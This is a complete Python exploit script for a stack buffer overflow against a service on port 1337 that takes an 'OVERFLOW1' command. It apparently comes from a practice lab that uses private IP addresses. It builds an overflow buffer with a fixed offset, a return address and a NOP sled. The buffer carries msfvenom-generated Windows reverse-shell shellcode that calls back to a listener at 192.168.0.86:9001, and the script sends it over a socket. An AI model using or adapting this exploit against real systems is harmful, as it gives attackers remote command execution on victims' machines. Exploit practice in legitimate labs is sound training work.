#!/usr/bin/env python3
import socket

ip = "192.168.0.87"
port = 1337

badchars = "".join([chr(int(hex(x),16)) for x in range(1,256)])
prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62" # \x03\x12\x50\x62 \xaf\x11\x50\x62
padding = "\x90" * 16

# Badchars: \x00\x07\x2e\xa0
# Payload: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.86 LPORT=9001 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
payload = (
"\xdd\xc3\xbe\xc0\x90\x8e\x39\xd9\x74\x24\xf4\x5f\x2b\xc9"
"\xb1\x52\x83\xc7\x04\x31\x77\x13\x03\xb7\x83\x6c\xcc\xcb"
"\x4c\xf2\x2f\x33\x8d\x93\xa6\xd6\xbc\x93\xdd\x93\xef\x23"
"\x95\xf1\x03\xcf\xfb\xe1\x90\xbd\xd3\x06\x10\x0b\x02\x29"
"\xa1\x20\x76\x28\x21\x3b\xab\x8a\x18\xf4\xbe\xcb\x5d\xe9"
"\x33\x99\x36\x65\xe1\x0d\x32\x33\x3a\xa6\x08\xd5\x3a\x5b"
"\xd8\xd4\x6b\xca\x52\x8f\xab\xed\xb7\xbb\xe5\xf5\xd4\x86"
"\xbc\x8e\x2f\x7c\x3f\x46\x7e\x7d\xec\xa7\x4e\x8c\xec\xe0"
"\x69\x6f\x9b\x18\x8a\x12\x9c\xdf\xf0\xc8\x29\xfb\x53\x9a"
"\x8a\x27\x65\x4f\x4c\xac\x69\x24\x1a\xea\x6d\xbb\xcf\x81"
"\x8a\x30\xee\x45\x1b\x02\xd5\x41\x47\xd0\x74\xd0\x2d\xb7"
"\x89\x02\x8e\x68\x2c\x49\x23\x7c\x5d\x10\x2c\xb1\x6c\xaa"
"\xac\xdd\xe7\xd9\x9e\x42\x5c\x75\x93\x0b\x7a\x82\xd4\x21"
"\x3a\x1c\x2b\xca\x3b\x35\xe8\x9e\x6b\x2d\xd9\x9e\xe7\xad"
"\xe6\x4a\xa7\xfd\x48\x25\x08\xad\x28\x95\xe0\xa7\xa6\xca"
"\x11\xc8\x6c\x63\xbb\x33\xe7\x4c\x94\x3b\xa1\x24\xe7\x3b"
"\x6e\x9c\x6e\xdd\x1a\xce\x26\x76\xb3\x77\x63\x0c\x22\x77"
"\xb9\x69\x64\xf3\x4e\x8e\x2b\xf4\x3b\x9c\xdc\xf4\x71\xfe"                        
"\x4b\x0a\xac\x96\x10\x99\x2b\x66\x5e\x82\xe3\x31\x37\x74"                        
"\xfa\xd7\xa5\x2f\x54\xc5\x37\xa9\x9f\x4d\xec\x0a\x21\x4c"                        
"\x61\x36\x05\x5e\xbf\xb7\x01\x0a\x6f\xee\xdf\xe4\xc9\x58"                        
"\xae\x5e\x80\x37\x78\x36\x55\x74\xbb\x40\x5a\x51\x4d\xac"
"\xeb\x0c\x08\xd3\xc4\xd8\x9c\xac\x38\x79\x62\x67\xf9\x99"                        
"\x81\xad\xf4\x31\x1c\x24\xb5\x5f\x9f\x93\xfa\x59\x1c\x11"                        
"\x83\x9d\x3c\x50\x86\xda\xfa\x89\xfa\x73\x6f\xad\xa9\x74"                        
"\xba"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")